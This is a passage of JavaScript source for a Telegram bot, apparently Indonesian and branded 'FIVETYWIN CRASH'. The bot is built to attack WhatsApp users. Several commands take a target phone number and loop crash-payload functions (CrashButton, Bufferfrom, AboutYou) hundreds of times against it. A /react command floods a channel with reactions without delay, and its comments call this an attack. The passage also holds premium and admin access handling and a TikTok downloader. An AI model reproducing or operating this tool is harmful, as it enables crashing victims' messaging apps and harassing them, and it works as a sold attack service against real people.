        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 100; i++) {
      await AboutYou(target, ptcp = true);
      await AboutYou(target, ptcp = true);
      await AboutYou(target, ptcp = true);
      await AboutYou(target, ptcp = true);
      await sleep(1000);
    }

    console.log(chalk.red(`𖣂 FIVETYWIN CRASH ATTACK 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});


bot.onText(/\/Pahtomx (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const fotobug = sendbug;
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (false) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH </blockquote>
ʟᴜ sɪᴀᴘᴀ ᴋᴏɴᴛᴏʟ ूाीू
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, fotobug, {
    caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 100; i++) {
      await CrashButton(sock, target);
      await CrashButton(sock, target);
      await CrashButton(sock, target);
      await CrashButton(sock, target);
      await sleep(1000);
    }

    console.log(chalk.red(`𖣂 FIVETYWIN CRASH ATTACK 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});


bot.onText(/\/Xatoni (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const chatType = msg.chat?.type;
  const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
  const targetNumber = match[1];
  const fotobug = sendbug;
  const cooldown = checkCooldown(userId);
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (false) {
    return bot.sendPhoto(chatId, getRandomImage(), {
      caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH </blockquote>
ʟᴜ sɪᴀᴘᴀ ᴋᴏɴᴛᴏʟ ूाीू
`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/+qBTUzSM4Hrw4NjE1" }]
        ]
      }
    });
  }

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /addbot terlebih dahulu.`);
  }

  if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }

  const sent = await bot.sendPhoto(chatId, fotobug, {
    caption: `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
`,
    parse_mode: "HTML"
  });

  try {
    await new Promise(r => setTimeout(r, 1000));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target: ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Process
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );

    /// --- ( Forlet ) --- \\\
    for (let i = 0; i < 100; i++) {
      await Bufferfrom(sock, target);
      await Bufferfrom(sock, target);
      await Bufferfrom(sock, target);
      await Bufferfrom(sock, target);
      await sleep(1000);
    }

    console.log(chalk.red(`𖣂 FIVETYWIN CRASH ATTACK 𖣂`));

    await bot.editMessageCaption(
      `
<blockquote>｢ Ϟ ｣ FIVETYWIN CRASH</blockquote>
𖥂 Target : ${formattedNumber}
𖥂 Type Bug : INVIS
𖥂 Status : Successfully Sending Bug
𖥂 Date now : ${date}

© FIVETYWIN CRASH
      `,
      {
        chat_id: chatId,
        message_id: sent.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⏤͟͟͞͞𝑪𝒆𝒌 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${formattedNumber}` }]
          ]
        }
      }
    );
  } catch (err) {
    await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
  }
});

/// --------- ( Plungi ) --------- \\\

/// --- ( case add bot ) --- \\\
bot.onText(/^\/addbot\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const botNumber = match[1].replace(/[^0-9]/g, ""); 

 if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, `
ғɪᴛᴜʀ ɪɴɪ ʙᴜᴀᴛ ᴏᴡɴᴇʀ & ᴀᴅᴍɪɴ ɢᴡ ʟᴀʜ ूाीू
`, { parse_mode: "Markdown" });
  }

  if (!botNumber || botNumber.length < 8) {
    return bot.sendMessage(chatId, `
⚠️ Nomor tidak valid.
Gunakan format: \`/addbot 628xxxxxx\`
`, { parse_mode: "Markdown" });
  }

  try {
    await bot.sendMessage(chatId, `
🔄 Sedang menghubungkan *${botNumber}@s.whatsapp.net* ke sistem...
Mohon tunggu sebentar.
`, { parse_mode: "Markdown" });

    await connectToWhatsApp(botNumber, chatId);

    await bot.sendMessage(chatId, `
✅ *Berhasil terhubung!*
Bot WhatsApp aktif dengan nomor: *${botNumber}*
`, { parse_mode: "Markdown" });

  } catch (error) {
    console.error("❌ Error in /addbot:", error);
    bot.sendMessage(chatId, `
❌ Gagal menghubungkan ke WhatsApp.
> ${error.message || "Silakan coba lagi nanti."}
`, { parse_mode: "Markdown" });
  }
});
//listsender 
bot.onText(/^\/listsender$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // 🧑‍💻 Cek akses admin / owner
  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, `
ғɪᴛᴜʀ ɪɴɪ ʙᴜᴀᴛ ᴏᴡɴᴇʀ & ᴀᴅᴍɪɴ ɢᴡ ʟᴀʜ ूाीू
`, { parse_mode: "Markdown" });
  }

  const list = Array.from(sessions.keys());
  const text = list.length
    ? list.map((num, i) => `${i + 1}. ${num}`).join("\n")
    : "❌ Tidak ada sender aktif.";

  await bot.sendMessage(chatId, `
<b>📜 Daftar Sender Aktif:</b>
${text}
`, { parse_mode: "HTML" });
});
//delsender 

bot.onText(/^\/delsender\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const number = match[1];

  // 🧑‍💻 Cek akses admin / owner
  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, `
ғɪᴛᴜʀ ɪɴɪ ʙᴜᴀᴛ ᴏᴡɴᴇʀ & ᴀᴅᴍɪɴ ɢᴡ ʟᴀʜ ूाीू
`, { parse_mode: "Markdown" });
  }

  // 🔍 Cek apakah nomor ada di sesi aktif
  if (!sessions.has(number)) {
    return bot.sendMessage(chatId, `
❌ Sender *${number}* tidak ditemukan di sesi aktif.
`, { parse_mode: "Markdown" });
  }

  // 🗑️ Hapus sender dari sesi
  sessions.delete(number);

  // Jika kamu juga menyimpan di file senders.json:
  const fs = require("fs");
  const sendersFile = "./senders.json";
  let senders = [];

  if (fs.existsSync(sendersFile)) {
    senders = JSON.parse(fs.readFileSync(sendersFile, "utf8"));
    senders = senders.filter(s => s !== number);
    fs.writeFileSync(sendersFile, JSON.stringify(senders, null, 2));
  }

  // ✅ Konfirmasi ke user
  return bot.sendMessage(chatId, `
✅ Sender *${number}* berhasil dihapus dari daftar.
`, { parse_mode: "Markdown" });
});

/// --- ( case group only ) --- \\\     
bot.onText(/^\/gruponly\s+(on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const mode = match[1].toLowerCase();
  const status = mode === "on";

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `
❌ *Akses ditolak!*
Perintah ini hanya bisa digunakan oleh *Owner/Admin*.`, { parse_mode: "Markdown" });
  }

  try {
    const data = { groupOnly: status };
    fs.writeFileSync(ONLY_FILE, JSON.stringify(data, null, 2));

    bot.sendMessage(chatId, `
⚙️ *Mode Group Only* berhasil diperbarui!
Status: *${status ? "AKTIF ✅" : "NONAKTIF ❌"}*
`, { parse_mode: "Markdown" });

  } catch (err) {
    console.error("Gagal menyimpan status Group Only:", err);
    bot.sendMessage(chatId, `
❌ Terjadi kesalahan saat menyimpan konfigurasi.
${err.message}
`, { parse_mode: "Markdown" });
  }
});

/// --- ( case add acces premium ) --- \\\
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `
( ⚠️ ) *Akses Ditolak!*
Anda tidak memiliki izin untuk menjalankan perintah ini.`, { parse_mode: "Markdown" });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, `
( ❌ ) *Perintah Salah!*
Gunakan format berikut:
✅ /addprem <code>8307751013 30d</code>
`, { parse_mode: "HTML" });
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
    return bot.sendMessage(chatId, `
( ❌ ) *Perintah Salah!*
Gunakan format:
✅ /addprem <code>8307751013 30d</code>
`, { parse_mode: "HTML" });
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1].toLowerCase();

  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
( ❌ ) *ID Tidak Valid!*
Gunakan hanya angka ID Telegram.
✅ Contoh: /addprem 8307751013 30d
`, { parse_mode: "Markdown" });
  }

  if (!/^\d+[dhm]$/.test(duration)) {
    return bot.sendMessage(chatId, `
( ❌ ) *Durasi Tidak Valid!*
Gunakan format seperti: 30d, 12h, atau 15m.
✅ Contoh: /addprem 8307751013 30d
`, { parse_mode: "Markdown" });
  }

  const timeValue = parseInt(duration);
  const timeUnit = duration.endsWith("d") ? "days" :
                   duration.endsWith("h") ? "hours" : "minutes";
  const expirationDate = moment().add(timeValue, timeUnit);

  const existingUser = premiumUsers.find(u => u.id === userId);
  if (existingUser) {
    existingUser.expiresAt = expirationDate.toISOString();
    savePremiumUsers();
    bot.sendMessage(chatId, `
✅ *User sudah premium!*
Waktu diperpanjang sampai:
🕓 ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}
`, { parse_mode: "Markdown" });
  } else {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    bot.sendMessage(chatId, `
✅ *Berhasil menambahkan user premium!*
👤 ID: ${userId}
⏰ Berlaku hingga: ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}
`, { parse_mode: "Markdown" });
  }

  console.log(`[PREMIUM] ${senderId} menambahkan ${userId} sampai ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
});

/// --- ( case list acces premium ) --- \\\
bot.onText(/\/listprem/, (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
  }

      if (premiumUsers.length === 0) {
      return bot.sendMessage(chatId, "📌 No premium users found.");
  }

      let message = "```";
      message += "\n";
      message += " ( + )  LIST PREMIUM USERS\n";
      message += "\n";
      premiumUsers.forEach((user, index) => {
      const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
      message += `${index + 1}. ID: ${user.id}\n   Exp: ${expiresAt}\n`;
      });
      message += "\n```";

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// --- ( case add admin ) ---
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      `❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired.
✅ Contoh: /addadmin 8307751013 30d
`);
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired.
✅ Contoh: /addadmin 8307751013 30d
`);
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `
✅ Berhasil menambahkan admin!
Kini user ${userId} memiliki akses admin.
`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} sudah menjadi admin.`);
  }
});


// --- ( case delete acces premium ) ---
bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner/admin yang dapat melakukan command ini.`);
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /delprem 8307751013`);
  }

  const userId = parseInt(match[1]);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, "❌ Invalid input. User ID harus berupa angka.");
  }

  const index = premiumUsers.findIndex(user => user.id === userId);
  if (index === -1) {
    return bot.sendMessage(chatId, `❌ User ${userId} tidak terdaftar di list premium.`);
  }

  premiumUsers.splice(index, 1);
  savePremiumUsers();
  bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar premium.`);
});


// --- ( case delete acces admin ) ---
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      `❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
      { parse_mode: "Markdown" }
    );
  }

  if (!match || !match[1]) {
    return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /deladmin 8307751013`);
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
❌ Command salah!
✅ Contoh: /deladmin 8307751013`);
  }

  const adminIndex = adminUsers.indexOf(userId);
  if (adminIndex !== -1) {
    adminUsers.splice(adminIndex, 1);
    saveAdminUsers();
    console.log(`${senderId} Removed ${userId} From Admin`);
    bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} belum memiliki akses admin.`);
  }
});


// --- ( Case Tools Menu ) --- \\

const linkRegex = /https:\/\/whatsapp\.com\/channel\/([a-zA-Z0-9]+)\/([0-9]+)/;

bot.onText(/\/reactvelocity\s+(\S+)\s+(.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const fullLink = match[1];
    const emojiString = match[2];

    if (!sock) return bot.sendMessage(chatId, "⚠️ WA Belum Connect!");

    const linkData = fullLink.match(linkRegex);
    if (!linkData) return bot.sendMessage(chatId, "❌ Link Salah! Harus format Channel.");

    const inviteCode = linkData[1];
    const messageId = linkData[2];

    const emojiList = Array.from(emojiString.replace(/\s/g, ''));

    const statusMsg = await bot.sendMessage(chatId, `
🔄 *PROCESSING REQUEST...*
Sedang Emoji Velocity (Bergantian Cepat Otomatis) dari ${emojiList.join(' ')} (${emojiList.length} Emojis)
    `, { parse_mode: 'Markdown' });

    try {
        const metadata = await sock.newsletterMetadata("invite", inviteCode);
        const channelJid = metadata.id;

        await bot.editMessageText(`✅ FOUND: ${metadata.name}`, {
            chat_id: chatId, 
            message_id: statusMsg.message_id,
            parse_mode: 'Markdown'
        });

        for (let i = 0; i < emojiList.length; i++) {
            const currentEmoji = emojiList[i];
            
            console.log(`Sending ${currentEmoji} to ${messageId}`);

            await sock.sendMessage(channelJid, {
                react: {
                    text: currentEmoji,
                    key: {
                        remoteJid: channelJid,
                        id: messageId,
                        fromMe: false
                    }
                }
            });

            await delay(1000); 
        }

        await bot.editMessageText(`
✅ *FINISHED!*

Sukses mengirim ${emojiList.length} variasi reaksi.
Emoji terakhir yang menempel: ${emojiList[emojiList.length - 1]}
        `, {
            chat_id: chatId, 
            message_id: statusMsg.message_id, 
            parse_mode: 'Markdown'
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, `❌ GAGAL: ${error.message}`);
    }
});

const channelRegex = /https:\/\/whatsapp\.com\/channel\/([a-zA-Z0-9]+)\/([0-9]+)/;

bot.onText(/\/react\s+(\S+)\s+(\S+)\s+(\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const link = match[1];
    const emoji = match[2];
    const count = parseInt(match[3]);

    if (!sock) return bot.sendMessage(chatId, "⚠️ WA Belum Siap!");

    const linkMatch = link.match(channelRegex);
    if (!linkMatch) return bot.sendMessage(chatId, "❌ Link Salah!");

    const inviteCode = linkMatch[1];
    const messageId = linkMatch[2];

    const statusMsg = await bot.sendMessage(chatId, `
🚀 *PREPARING FIVETYWIN CRASH ATTACK...*

🔗 Target: ${inviteCode}
💣 Count: ${count}
⚡ Mode: Asynchronous Flood
    `, { parse_mode: 'Markdown' });

    try {
        const metadata = await sock.newsletterMetadata("invite", inviteCode);
        const channelJid = metadata.id;

        await bot.editMessageText(`✅ Locked: ${metadata.name}\n🚀 *FIRING PACKETS...*`, {
            chat_id: chatId, 
            message_id: statusMsg.message_id, 
            parse_mode: 'Markdown'
        });

        // ====================================================
        // 💀 THE 𝐏𝐇𝐀𝐓𝐎𝐌𝐈𝐗 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 LOGIC (NO AWAIT LOOP)
        // ====================================================
        
        // Kita membuat array Promise kosong
        const attackPromises = [];

        console.log(`[START] Menembakkan ${count} paket tanpa jeda...`);

        for (let i = 0; i < count; i++) {
            // PENTING: Kita TIDAK pakai 'await' di sini agar tidak menunggu.
            // Kita dorong request langsung ke antrian eksekusi.
            
            // Trik 1: Kirim Reaksi
            const p1 = sock.sendMessage(channelJid, {
                react: { text: emoji, key: { remoteJid: channelJid, id: messageId, fromMe: false } }
            });
            attackPromises.push(p1);

            // Trik 2 (Opsional): Hapus Reaksi (Kirim string kosong) agar bisa di-react lagi
            // Jika video itu membuat notifikasi berbunyi berkali-kali, pasti pakai trik ini.
            // Uncomment baris di bawah jika ingin mode "Kedap-Kedip"
            /*
            const p2 = sock.sendMessage(channelJid, {
                react: { text: "", key: { remoteJid: channelJid, id: messageId, fromMe: false } }
            });
            attackPromises.push(p2);
            */
           
            // Jeda super mikro (10ms) agar socket tidak langsung crash seketika
            if (i % 50 === 0) await delay(10); 
        }

        // Tunggu sampai semua "peluru" ditembakkan (walaupun server belum tentu proses semua)
        await Promise.allSettled(attackPromises);

        console.log(`[DONE] ${count} Packets sent.`);

        // Laporan Selesai
        await bot.editMessageText(`
✅ *𝐏𝐇𝐀𝐓𝐎𝐌𝐈𝐗 𝐂𝐑𝐀𝐒𝐇𝐄𝐑 ATTACK FINISHED!*

──────────────────
🎯 *Target:* ${metadata.name}
💣 *Packets Fired:* ${count}
⏱️ *Time:* ${(count * 0.001).toFixed(2)}s (Estimated)
🔥 *Note:* Server WhatsApp mungkin memfilter sebagian request ini.
──────────────────
*Ravage Bot 𝐏𝐇𝐀𝐓𝐎𝐌𝐈𝐗 𝐂𝐑𝐀𝐒𝐇𝐄𝐑*
        `, {
            chat_id: chatId, 
            message_id: statusMsg.message_id, 
            parse_mode: 'Markdown'
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, `❌ CRASH: ${error.message}`);
    }
});

async function tiktokDl(url) {
        return new Promise(async (resolve, reject) => {
            try {
                let data = [];
                function formatNumber(integer) {
                    return Number(parseInt(integer)).toLocaleString().replace(/,/g, ".");
                }

                function formatDate(n, locale = "id-ID") {
                    let d = new Date(n);
                    return d.toLocaleDateString(locale, {
                        weekday: "long",
                        day: "numeric",
                        month: "long",
                        year: "numeric",
                        hour: "numeric",
                        minute: "numeric",
                        second: "numeric",
                    });
                }

                let domain = "https://www.tikwm.com/api/";
                let res = await (
                    await axios.post(
                        domain,
                        {},
                        {
                            headers: {
                                Accept: "application/json, text/javascript, */*; q=0.01",
                                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                                Origin: "https://www.tikwm.com",
                                Referer: "https://www.tikwm.com/",
                                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
                            },
                            params: {
                                url: url,
                                count: 12,
                                cursor: 0,
                                web: 1,
                                hd: 2,
                            },
                        }
                    )
                ).data.data;

                if (!res) return reject("⚠️ *Gagal mengambil data!*");

                if (res.duration == 0) {
                    res.images.forEach((v) => {
                        data.push({ type: "photo", url: v });
                    });
                } else {
                    data.push(
                        {
                            type: "watermark",
                            url: "https://www.tikwm.com" + res?.wmplay || "/undefined",
                        },
                        {
                            type: "nowatermark",
                            url: "https://www.tikwm.com" + res?.play || "/undefined",
                        },
                        {
                            type: "nowatermark_hd",
                            url: "https://www.tikwm.com" + res?.hdplay || "/undefined",
                        }
                    );
                }

                resolve({
                    status: true,
                    title: res.title,
                    taken_at: formatDate(res.create_time).replace("1970", ""),
                    region: res.region,
                    id: res.id,
                    duration: res.duration + " detik",
                    cover: "https://www.tikwm.com" + res.cover,
                    stats: {
                        views: formatNumber(res.play_count),
                        likes: formatNumber(res.digg_count),
                        comment: formatNumber(res.comment_count),
                        share: formatNumber(res.share_count),
                        download: formatNumber(res.download_count),
                    },
                    author: {
                        id: res.author.id,
                        fullname: res.author.unique_id,
                        nickname: res.author.nickname,
                        avatar: "https://www.tikwm.com" + res.author.avatar,
                    },
                    video_links: data,
                });
            } catch (e) {
                reject("⚠️ *Terjadi kesalahan saat mengambil video!*");
            }
        });
    }
    
    bot.onText(/\/tiktok (.+)/, async (msg, match) => {
        const chatId = msg.chat.id;
        const url = match[1];
        if (!/^(https?:\/\/)?(www\.|vm\.|vt\.)?tiktok\.com\/.+/.test(url)) {
            return bot.sendMessage(chatId, "⚠️ *URL TikTok tidak valid!*", { parse_mode: "Markdown" });
        }
        let loadingMessage = await bot.sendMessage(chatId, "⏳ *Mengunduh video, mohon tunggu...*", { parse_mode: "Markdown" });
        try {
            const result = await tiktokDl(url);
            const video = result.video_links.find(v => v.type === "nowatermark" || v.type === "hd");
            if (!video || !video.url) {
                await bot.deleteMessage(chatId, loadingMessage.message_id);
                return bot.sendMessage(chatId, "⚠️ *Gagal mendapatkan video tanpa watermark!*", { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });
            }
            const caption = `✅ *Video TikTok Berhasil Diunduh!*\n\n` + `📌 *${result.title || 'Tanpa Judul'}*\n` + `👤 *${result.author?.nickname || 'Anonim'}*\n\n` + `❤️ *${result.stats?.likes || 0}* suka · ` + `💬 *${result.stats?.comment || 0}* komentar · ` + `🔄 *${result.stats?.share || 0}* dibagikan`;
            await bot.sendVideo(chatId, video.url, { caption, reply_to_message_id: msg.message_id, parse_mode: "Markdown" });
            await bot.deleteMessage(chatId, loadingMessage.message_id);
        } catch (err) {
            if (loadingMessage) await bot.deleteMessage(chatId, loadingMessage.message_id);
            console.error("Error saat mengunduh TikTok:", err);
            bot.sendMessage(chatId, `❌ *Gagal mengambil video:*\n\nVideo mungkin bersifat pribadi atau link tidak valid.`, { parse_mode: "Markdown", reply_to_message_id: msg.message_id });
        }
    });

bot.onText(/\/play (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const sender = msg.from.username || msg.from.first_name;
  const query = match[1];

  if (false) {
    return bot.sendMessage(chatId, `
⛔ *Unverified Bot!*
Use commands:
\`/Password <key>\`
To activate the bot.
    `, { parse_mode: "Markdown" });
  }
  
  try {
    await bot.sendMessage(chatId, "⏳ Lagi nyari lagu di Spotify, tunggu bentar bre...");

    const api = `https://api.nekolabs.my.id/downloader/spotify/play/v1?q=${encodeURIComponent(query)}`;
    const { data } = await axios.get(api);

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal ambil data lagu dari Spotify!");
    }

    const { metadata, downloadUrl } = data.result;
    const { title, artist, cover, duration } = metadata;

    const caption = `
<blockquote>🎵 ${title || "Unknown"}</blockquote>
<blockquote>👤 ${artist || "Unknown"}</blockquote>
<blockquote>🕒 Durasi: ${duration || "-"}</blockquote>
`;

    await bot.sendVideo(chatId, cover, {
      caption,
      parse_mode: "HTML",
    });

    await bot.sendAudio(chatId, downloadUrl, {
      title: title || "Unknown Title",
